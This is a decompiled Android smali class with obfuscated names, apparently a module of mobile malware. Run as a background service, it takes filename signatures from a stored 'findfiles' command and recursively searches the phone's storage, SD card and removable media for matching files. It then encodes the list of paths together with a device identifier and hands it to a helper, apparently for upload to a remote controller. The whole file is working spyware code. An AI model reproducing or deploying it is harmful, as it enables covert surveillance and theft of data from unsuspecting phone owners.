.class public Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Ljava/lang/String;

.field c:[Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "mvqkjokaxfrpf"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method a(Ljava/io/File;)V
    .locals 8

    :try_start_0
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v0, p1}, Ljava/io/PrintStream;->println(Ljava/lang/Object;)V

    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_3

    aget-object v3, p1, v2

    invoke-virtual {v3}, Ljava/io/File;->isDirectory()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b(Ljava/io/File;)V

    goto :goto_2

    :cond_0
    invoke-virtual {v3}, Ljava/io/File;->isFile()Z

    move-result v4

    if-eqz v4, :cond_2

    const/4 v4, 0x0

    :goto_1
    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->c:[Ljava/lang/String;

    array-length v5, v5

    if-ge v4, v5, :cond_2

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->c:[Ljava/lang/String;

    aget-object v5, v5, v4

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v7, 0x1

    if-le v6, v7, :cond_1

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "|*|"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    :cond_2
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :catch_0
    :cond_3
    return-void
.end method

.method b(Ljava/io/File;)V
    .locals 8

    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_3

    aget-object v3, p1, v2

    invoke-virtual {v3}, Ljava/io/File;->isDirectory()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b(Ljava/io/File;)V

    goto :goto_2

    :cond_0
    invoke-virtual {v3}, Ljava/io/File;->isFile()Z

    move-result v4

    if-eqz v4, :cond_2

    const/4 v4, 0x0

    :goto_1
    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->c:[Ljava/lang/String;

    array-length v5, v5

    if-ge v4, v5, :cond_2

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->c:[Ljava/lang/String;

    aget-object v5, v5, v4

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v7, 0x1

    if-le v6, v7, :cond_1

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "|*|"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b:Ljava/lang/String;

    :cond_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    :cond_2
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 6

    :try_start_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "findfiles"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "/"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "/"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->c:[Ljava/lang/String;

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->c:[Ljava/lang/String;

    const/4 v1, 0x0

    aput-object p1, v0, v1

    :goto_0
    new-instance p1, Ljava/io/File;

    const-string v0, "/mnt"

    invoke-direct {p1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v0, Ljava/io/File;

    const-string v1, "/mount"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/io/File;

    const-string v2, "/sdcard"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    const-string v3, "/storage"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/io/File;

    const-string v4, "/Removable"

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v4

    invoke-virtual {p0, v4}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a(Ljava/io/File;)V

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a(Ljava/io/File;)V

    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a(Ljava/io/File;)V

    invoke-virtual {p0, v1}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a(Ljava/io/File;)V

    invoke-virtual {p0, v2}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a(Ljava/io/File;)V

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a(Ljava/io/File;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->b:Ljava/lang/String;

    const-string v0, "|*|"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v1, 0xa

    if-le v0, v1, :cond_1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Found files by signatures:\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "4"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "p="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v5, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "|"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "|"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p0, v1, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "findfiles"

    const-string v1, "**false**"

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
